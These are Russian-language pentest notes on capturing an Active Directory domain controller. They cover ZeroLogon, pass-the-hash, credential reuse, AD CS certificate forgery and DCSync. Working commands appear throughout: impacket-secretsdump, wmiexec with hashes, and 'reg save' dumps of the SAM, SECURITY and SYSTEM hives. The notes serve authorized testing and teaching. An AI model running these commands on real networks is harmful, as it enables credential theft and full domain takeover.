**Не всегда целью атаки служит - компрометация контроллера домена, можно остановиться и на наименее чувствительных данных в сети, но контроллер домена является максимальной целью**

## Способы захвата контроллера домена

### 1) Эксплуатация уязвимостей узла контроллера домена

Можем попытаться:
- Найти секреты или учетные данные, оставленные на узле
- Проэксплуатировать известные уязвимости:
	- PrintNightmare
	- ZeroLogon
	- [SamAccountNameSpoofing](https://habr.com/ru/post/594923/)

### 2) Поиск специальных привилегий, оставленных в любом из узлов локальной сети

Возможно взломав учетную запись локального администратора, с помощью этой учетки мы сможем управлять контроллером домена

1) Получаем креды простого пользователя на узле
2) Используем данные креды в запущенных сервисах
3) Находим узлы, в которых у нас есть доступ локального админа
4) На новой машине также извлекаем креды 
5) Повторяем действие пока не получим креды наиболее привилигированных пользователей

[Поиск групп привилигированных пользователей](https://activedirectorypro.com/privileged-accounts-active-directory/)


### 3)  Эксплуатация отдельных служб внутри доменной инфраструктуры (Известная уязвимость zerologon)

Можно воспользоваться утилитой для подключения к домен-контроллеру и просмотреть информацию об объектах

```sh
impacket-secretsdump --no-pass --user administrator 'sandbox.local/DC1$@192.168.0.172'
```

Далее после получения хэша можно воспользоваться методом hash-the-pass и подключиться к пользователю по хэшу

`impacket-wmiexec -hashes {llm:ntlm} 'sandbox.local/administrator@192.168.0.172'`

> Уязвимость Zerologon удаляет пароли из домен контроллера, что может полность обрушить сеть и выдать злоумышленника, поэтому необходимо вернуть пароли на место

1) Для начала необходимо считать из истории все пароли которые хранил домен котроллер. Для этого нужно прочитать файлы реестра:
	- SAM - хэши пользователей
	- SECURITY - хэши kerberos ключей
	- SYSTEM - инфа для расшифровки реестра SAM

2) Формируем файлы на Windows машине и скачиваем на нашу машину
```sh
reg save HKLM/SAM sam.save
reg save HKLM/SECURITY secutiry.save
reg save HKLM/SYSTEM system.save

lget sam.save
lget secutiry.save
lget system.save

del \f sam.save secutiry.save system.save
```

3) Получаем доступ к локальным секретам домен контроллера
	```sh
impacket-secretsdump -sam sam.save -security security.save -system system.save
	```

4) Необходимо взять хэш `$MACHINE.ACC:plain_password_hex:...`

5) Далее в самом эксплойте изменить ACTION с REMOVE на RESTORE
```sh
	set PASSWORD <$MACHINE.ACC hex password>
```

### 4)  Эксплуатация миссконфигураций сервисов в AD

1) Получаем доступ к машине
2) Так как она находится в сети, о на ней где-то хранятся учетные записи других узлов
3) Этот файлы может быть расположен в доступном месте: /tmp, /etc, *.ccache, *.keytab
4) При помощи этих данных проводит атаку `PassTheTicket`
5) Узнаем какая машина отвечает за AD CS `certutil -config - -ping`
6) Далее можем с помощью [Certipy](https://github.com/ly4k/Certipy#esc1) выпустить себе поддельный сертификат на имя администратора домена

## Захват контроллера домена

> Захватом является получение уровня доступа на узле, соответствующему привилегиям домен контроллера

_Наивысшие права имеет учетная запись из группы **Enterprise Admins**_

Зачастую не нужно получения этих прав, также высокими правами обладают **Администраторы (доступ ко всем контроллерам домена в контексте домена)** и **Администраторы Домена (в распоряжении все компьютеры домена)**

### DCSync Attack - атака по выгрузке всех хэшей, секретов, ключей пользователей с домен контроллера

DCSync использует протокол MS-DRSR для того чтобы имитировать поведение домен контроллера, MS-DRSR неотъемлемая часть AD - всегда включен

#### Для проведения атаки используется утилита `secretsdump`

```sh
impacket-secretsdump test.local/john:password123@10.10.10.1
```

## Цель пентеста

Не всегда необходимо захватывать контроллер домена
Достаточно получить доступ к узлу базе данных и скомпрометировать, например,  группу `Администраторы-1С` 

Захват контроллера домена может быть необходим для демонстрации заказчику максимального ущерба, который может быть причинен организации
